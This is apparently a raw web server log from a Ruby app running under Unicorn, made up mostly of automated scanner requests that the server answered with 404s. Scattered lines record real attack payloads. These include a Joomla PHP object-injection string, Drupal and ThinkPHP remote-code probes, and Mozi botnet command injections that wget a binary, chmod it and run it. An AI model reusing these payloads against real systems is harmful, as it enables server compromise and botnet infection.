I, [2021-05-07T11:18:59.783677 #23842]  INFO -- : Refreshing Gem list
I, [2021-05-07T11:19:01.936574 #23842]  INFO -- : listening on addr=/var/www/my_app/shared/tmp/sockets/unicorn.sock fd=9
I, [2021-05-07T11:19:01.944471 #23846]  INFO -- : worker=0 ready
I, [2021-05-07T11:19:01.944735 #23842]  INFO -- : master process ready
I, [2021-05-07T11:19:02.797903 #24832]  INFO -- : executing ["/var/www/my_app/shared/bundle/ruby/2.6.0/bin/unicorn", "-c", "/var/www/my_app/current/config/unicorn.rb", "-E", "deployment", "-D", {9=>#<Kgio::UNIXServer:/var/www/my_app/shared/tmp/sockets/unicorn.sock>}] (in /var/www/my_app/releases/20210507111219)
I, [2021-05-07T11:19:02.798023 #24832]  INFO -- : forked child re-executing...
I, [2021-05-07T11:19:03.156937 #24832]  INFO -- : inherited addr=/var/www/my_app/shared/tmp/sockets/unicorn.sock fd=9
I, [2021-05-07T11:19:03.157211 #24832]  INFO -- : Refreshing Gem list
I, [2021-05-07T11:19:04.596646 #24832]  INFO -- : master process ready
I, [2021-05-07T11:19:04.604003 #25363]  INFO -- : worker=0 ready
I, [2021-05-07T11:19:04.689691 #23842]  INFO -- : reaped #<Process::Status: pid 23846 exit 0> worker=0
I, [2021-05-07T11:19:04.689795 #23842]  INFO -- : master complete
106.12.216.155 - - [18/May/2021:12:22:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0020
106.12.216.155 - - [18/May/2021:12:22:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:49 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:49 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:49 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:49 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:22:50 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:50 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:22:53 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:53 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:53 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:53 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:54 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:54 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:55 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:55 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:22:55 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:56 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:22:56 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:00 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:00 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:23:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:23:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:23:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:23:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:06 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:06 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:06 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:06 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:07 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:08 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
106.12.216.155 - - [18/May/2021:12:23:08 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:16 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:16 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:20 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:24 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:28 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:28 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:36 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:36 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:36 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:40 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:40 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:40 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:40 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:44 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:44 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:44 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:23:48 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:48 +0000] "POST /404 HTTP/1.0" 404 1722 0.0020
106.12.216.155 - - [18/May/2021:12:23:48 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:48 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:52 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:52 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:52 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:23:52 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:00 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:00 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:00 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:00 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:00 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:08 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:08 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:17 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:17 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:24:18 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:18 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:24:18 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:19 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:19 +0000] "POST /404?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78 HTTP/1.0" 404 1722 0.0022
}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý, 106.12.216.155 - - [18/May/2021:12:24:19 +0000] "GET / HTTP/1.0" 200 7270 0.0090
}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý, 106.12.216.155 - - [18/May/2021:12:24:19 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:19 +0000] "POST /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:24:19 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:24:20 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:20 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:24 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:24 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:28 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:28 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:28 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:28 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:24:28 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:29 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:29 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:29 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:29 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:29 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:30 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:31 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:31 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:31 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:31 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:32 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:36 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:36 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:36 +0000] "GET /404 HTTP/1.0" 404 1722 0.0181
106.12.216.155 - - [18/May/2021:12:24:36 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:36 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:37 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:37 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:38 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:38 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:38 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:39 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:39 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:39 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:40 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:40 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:44 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:24:44 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:48 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:52 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:56 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:57 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:57 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:57 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:24:57 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:24:58 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:00 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:00 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:01 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:01 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:01 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:02 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:05 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:12 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:12 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:25:12 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:12 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:13 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:14 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:15 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:15 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:15 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:16 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:16 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:16 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:20 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:20 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:20 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:21 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:25:21 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:21 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:21 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
106.12.216.155 - - [18/May/2021:12:25:22 +0000] "GET /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:25:22 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
106.12.216.155 - - [18/May/2021:12:25:32 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
106.12.216.155 - - [18/May/2021:12:25:32 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
106.12.216.155 - - [18/May/2021:12:25:36 +0000] "GET /login HTTP/1.0" 200 3039 0.0054
106.12.216.155 - - [18/May/2021:12:25:36 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
192.241.212.23 - - [18/May/2021:12:57:45 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
167.248.133.39 - - [18/May/2021:13:37:31 +0000] "GET / HTTP/1.0" 200 7270 0.0094
167.248.133.39 - - [18/May/2021:13:37:32 +0000] "GET / HTTP/1.0" 200 7270 0.0091
61.242.54.82 - - [18/May/2021:13:49:29 +0000] "GET /404?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 1722 0.0019
171.25.193.78 - - [18/May/2021:14:06:19 +0000] "HEAD /404 HTTP/1.0" 404 1722 0.0017
162.142.125.53 - - [18/May/2021:14:19:42 +0000] "GET / HTTP/1.0" 200 7270 0.0095
162.142.125.53 - - [18/May/2021:14:19:43 +0000] "GET / HTTP/1.0" 200 7270 0.0089
116.68.110.4 - - [18/May/2021:14:31:48 +0000] "GET /404?cd+/tmp;rm+-rf+*;wget+http://116.68.110.4:42012/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 1722 0.0018
192.35.168.160 - - [18/May/2021:15:36:35 +0000] "GET / HTTP/1.0" 200 7270 0.0099
101.0.54.190 - - [18/May/2021:15:47:15 +0000] "GET /404?username=ec8&psd=ec8 HTTP/1.0" 404 1722 0.0018
134.119.17.14 - - [18/May/2021:15:54:26 +0000] "POST /404 HTTP/1.0" 404 1722 0.0018
134.119.17.14 - - [18/May/2021:15:54:27 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
134.119.17.14 - - [18/May/2021:15:54:27 +0000] "GET /login HTTP/1.0" 200 3039 0.0059
134.119.17.14 - - [18/May/2021:15:54:27 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
134.119.17.14 - - [18/May/2021:15:54:28 +0000] "GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.0" 200 7270 0.0101
134.119.17.14 - - [18/May/2021:15:54:28 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
134.119.17.14 - - [18/May/2021:15:54:29 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
86.59.35.162 - - [18/May/2021:17:11:57 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET / HTTP/1.0" 200 7270 0.0102
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404?folderIds=0 HTTP/1.0" 404 34 0.0019
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0014
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0014
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0015
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 1722 0.0013
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 34 0.0015
139.162.125.122 - - [18/May/2021:17:25:04 +0000] "GET /404 HTTP/1.0" 404 34 0.0017
209.141.51.242 - - [18/May/2021:18:17:04 +0000] "GET /404?index=0 HTTP/1.0" 404 1722 0.0017
45.155.205.109 - - [18/May/2021:18:48:16 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
45.155.205.109 - - [18/May/2021:18:48:17 +0000] "GET /404?wt=json HTTP/1.0" 404 1722 0.0019
45.155.205.109 - - [18/May/2021:18:48:17 +0000] "GET /404?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 1722 0.0020
45.155.205.109 - - [18/May/2021:18:48:17 +0000] "POST /404 HTTP/1.0" 404 1722 0.0019
45.155.205.109 - - [18/May/2021:18:48:18 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 7270 0.0098
45.155.205.109 - - [18/May/2021:18:48:18 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 200 7270 0.0091
45.155.205.109 - - [18/May/2021:18:48:19 +0000] "GET /404 HTTP/1.0" 404 1722 0.0018
45.155.205.109 - - [18/May/2021:18:48:19 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
45.155.205.109 - - [18/May/2021:18:48:20 +0000] "GET /404 HTTP/1.0" 404 1722 0.0017
45.155.205.109 - - [18/May/2021:18:48:20 +0000] "POST /404 HTTP/1.0" 404 119 0.0018
45.155.205.109 - - [18/May/2021:18:48:20 +0000] "POST /404 HTTP/1.0" 404 1722 0.0017
51.159.31.151 - - [18/May/2021:19:26:02 +0000] "GET / HTTP/1.0" 200 7270 0.0103
34.95.143.140 - - [18/May/2021:19:42:12 +0000] "OPTIONS /404 HTTP/1.0" 404 1722 0.0017
43.239.152.123 - - [18/May/2021:20:45:49 +0000] "GET / HTTP/1.0" 200 7270 0.0096
178.128.219.39 - - [18/May/2021:21:05:53 +0000] "GET / HTTP/1.0" 200 7270 0.0095
172.104.242.173 - - [18/May/2021:21:31:09 +0000] "GET /404 HTTP/1.0" 404 1722 0.0016
